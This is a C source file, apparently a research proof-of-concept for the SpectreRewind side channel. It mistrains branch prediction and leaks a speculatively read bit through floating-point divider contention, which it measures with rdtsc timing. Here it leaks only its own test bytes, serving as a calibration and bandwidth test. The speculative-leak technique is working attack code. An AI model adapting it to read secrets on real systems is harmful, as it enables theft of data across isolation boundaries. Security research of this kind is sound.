/**
 * SpectreRewind PoC
 *
 * Copyright (C) 2020 Computer Systems Lab, University of Kansas.
 *
 * Part of library routines are from the meltdown PoC at:
 *   https://github.com/IAIK/meltdown
 * 
 * This file is distributed under the GPLv2 License. 
 */ 

/**************************************************************************
 * Conditional Compilation Options
 **************************************************************************/

/**************************************************************************
 * Included Files
 **************************************************************************/
#if !defined(__aarch64__)
#include <cpuid.h>
#endif 
#include <errno.h>
#include <fcntl.h>
#include <memory.h>
#include <pthread.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <inttypes.h>
#include <stdio.h>
#include <pthread.h>
#include <sys/mman.h>

/**************************************************************************
 * Public Definitions
 **************************************************************************/

/**************************************************************************
 * Public Types
 **************************************************************************/
typedef struct {
  size_t divsd_threshold; /**< threshold in cycles for the DIVSD channel */
} libkdump_config_t;
  
/**************************************************************************
 * Global Variables
 **************************************************************************/
static int dbg = 1;
static volatile uint64_t* counter = 0;
static libkdump_config_t config;
typedef enum { ERROR, INFO, SUCCESS } d_sym_t;
static pthread_t count_thread;

/**************************************************************************
 * Public Function Prototypes
 **************************************************************************/
static void debug(d_sym_t symbol, const char *fmt, ...) {
  if (!dbg)
    return;

  switch (symbol) {
  case ERROR:
    printf("\x1b[31;1m[-]\x1b[0m ");
    break;
  case INFO:
    printf("\x1b[33;1m[.]\x1b[0m ");
    break;
  case SUCCESS:
    printf("\x1b[32;1m[+]\x1b[0m ");
    break;
  default:
    break;
  }
  va_list ap;
  va_start(ap, fmt);
  vfprintf(stdout, fmt, ap);
  va_end(ap);
}

// ---------------------------------------------------------------------------
#if defined(__aarch64__)
static inline uint64_t rdtsc() {
  asm volatile ("DSB SY");	
  return *counter;
}

#else // !__aarch64__	

static inline uint64_t rdtsc() {
  uint64_t a = 0, d = 0;

  asm volatile("mfence");
#if defined(USE_RDTSCP) && defined(__x86_64__)
  asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
#elif defined(USE_RDTSCP) && defined(__i386__)
  asm volatile("rdtscp" : "=A"(a), :: "ecx");
#elif defined(__x86_64__)
  asm volatile("rdtsc" : "=a"(a), "=d"(d));
#elif defined(__i386__)
  asm volatile("rdtsc" : "=A"(a));
#endif
  a = (d << 32) | a;
  asm volatile("mfence");
  
  return a;
}
#endif

volatile char zero = 0;
volatile char ones = 0xff;

double my_number1 = 123456778910;
double my_number2 = 123456778910;
double my_number3 = 123456778910;
double my_number4 = 123456778910;

struct div_test
{
  double number;
  double div;
  volatile char *addr;
};

struct div_test trainer;
struct div_test transmit_0;
struct div_test transmit_1;
struct div_test transmit;

struct div_test *test_tasks[] = {
    &trainer,
    &trainer,
    &trainer,
    &trainer,
    &trainer,
    &trainer,
    &trainer,
    &transmit_0,
    &trainer,
    &trainer,
    &trainer,
    &trainer,
    &trainer,
    &trainer,
    &trainer,
    &transmit_1,
};

#define N_DIVS 12   // determine speculative execution length

int __attribute__ ((noinline)) transmit_bit( struct div_test * dt, int bit_no )
{
  double recv_num = dt->number;
  double div = dt->div;
  double send1, send2, send3, send4;
  volatile char *ptr = dt->addr;

  send1 = my_number1;
  send2 = my_number2;
  send3 = my_number3;
  send4 = my_number4;
  
  // receiver: control the speculation window size
  for (int i = 0; i < N_DIVS; i++) {
    recv_num /= div;
    // recv_num += 0;
  }
  if (recv_num == 1) { // trained true, but false when sending
    if ( *ptr & (1 << bit_no) ) { // trained false, but true when sending
      for (int x = 0; x < 100; x++) { // generate lots of contention
        send1 /= div;
        send2 /= div;
        send3 /= div;
        send4 /= div;
      }
    }
  }
  return recv_num + send1 + send2 + send3 + send4;

}

#define MIN(a,b) ((a<b) ? a : b)

#define N_TESTS 1000000
#define MAX_CYCLES 1024
static int histo[3][MAX_CYCLES];
static int total[3][N_TESTS];

static int comparator(const void *p, const void *q)
{
  return *(int *)p > *(int *)q;
}

uint64_t now_in_ns()
{
  struct timespec ts;
  clock_gettime(CLOCK_REALTIME, &ts);
  return ((uint64_t)ts.tv_sec * 1000000000 + ts.tv_nsec);
}

static void *countthread(void *dummy) {
  uint64_t local_counter = 0;
  while (1) {
    local_counter++;
    *counter = local_counter;
  }
}

// ---------------------------------------------------------------------------
static void __attribute__((optimize("-O2"), noinline)) detect_spectrerewind_threshold()
{
  uint64_t start = 0, end = 0, dur = 0;
  uint64_t bw_start = 0, bw_end = 0;
  double overall = N_TESTS;
  
  trainer.div = 3;
  trainer.number = 1;
  for (int i = 0; i < N_DIVS; i++) trainer.number *= trainer.div;
  trainer.addr = &zero; // training 

  transmit_0.number = 150;
  transmit_0.div = 1;
  transmit_0.addr = &zero;
  
  transmit_1.number = 150;
  transmit_1.div = 1;
  transmit_1.addr = &ones; // (char *)libkdump_phys_to_virt(libkdump_virt_to_phys((size_t)&ones));
  
#if defined(__aarch64__)
  counter = (volatile uint64_t *)mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
  int r = pthread_create(&count_thread, 0, countthread , 0);
#endif

  int n_addr = sizeof(test_tasks)/sizeof(test_tasks[0]);

  bw_start = now_in_ns();
  for (int j = 0; j < N_TESTS; j++) {
    for (int i = 0; i < n_addr; i++) {
      for (volatile int iter = 0; iter < 13; iter++); // IMPORTANT: add delay (> 13).
        
      start = rdtsc();
      transmit_bit(test_tasks[i], 0); // send secret when (i%8==7).
      end = rdtsc();
      
      dur = end - start;
      if (test_tasks[i] == &transmit_0) {
        if (dur < MAX_CYCLES) histo[0][dur]++;                    
        total[0][j] = dur;
      } else if (test_tasks[i] == &transmit_1) {
        if (dur < MAX_CYCLES) histo[1][dur]++;          
        total[1][j] = dur;
      } else if ( test_tasks[i] == &transmit) {
        if (dur < MAX_CYCLES) histo[2][dur]++;
        total[2][j] = dur;
      }
    }
  }
  bw_end = now_in_ns();

  // stats
  for (int i = 0; i < 2; i++) {
    qsort((void *)total[i], N_TESTS, sizeof(total[i][0]), comparator);
    debug(INFO, "Send %d timing (min, 1pct, median, 99pct, max): (%4d, %4d, %4d, %4d, %4d)\n", i,
          total[i][0], total[i][N_TESTS*1/100], total[i][N_TESTS/2],
          total[i][N_TESTS*99/100], total[i][N_TESTS-1]);
  }
  
  if (total[0][N_TESTS*99/100] < total[1][N_TESTS*1/100]) {
    config.divsd_threshold = (total[0][N_TESTS*99/100] + total[1][N_TESTS*1/100])/2;
  } else {
    config.divsd_threshold = (total[0][N_TESTS/2] + total[1][N_TESTS/2])/2;
  }
  debug(SUCCESS, "spectrerewind: divsd ch threshold: %d cycles\n", config.divsd_threshold);

  int err0_cnt = 0, err1_cnt = 0;
  for (int j = 0; j < N_TESTS; j++) {
    if (err0_cnt == 0 && total[0][N_TESTS-j-1] <= config.divsd_threshold) {
      debug(INFO, "0 - Error count: %d/%d, rate: %.2f\%\n", j, N_TESTS, (float)j * 100/ N_TESTS);
      err0_cnt = j;
    }
    if (err1_cnt == 0 && total[1][j] > config.divsd_threshold) {
      debug(INFO, "1 - Error count: %d/%d, rate: %.2f\%\n", j, N_TESTS, (float)j * 100/ N_TESTS);
      err1_cnt = j;
    }
    if (err0_cnt > 0 && err1_cnt > 0) {
      debug(INFO, "Error rate: %.2f\%\n", (double)(err0_cnt + err1_cnt) / 2 * 100 / N_TESTS);
      break;
    }
  }

  debug(INFO, "Transfer rate: %.2f KB/s\n", (double) 2 * N_TESTS * 1000000 / 8 / (bw_end - bw_start) );
  if (dbg){
    for(int i = 0; i < MAX_CYCLES; i++) {
      fprintf(stderr, "%d\t%0.5f\t%0.5f\t%0.5f\n", i,
              histo[0][i]/overall, histo[1][i]/overall, histo[2][i]/overall );
    }
  }
}

int main(int argc, char *argv[])
{
  detect_spectrerewind_threshold();
}
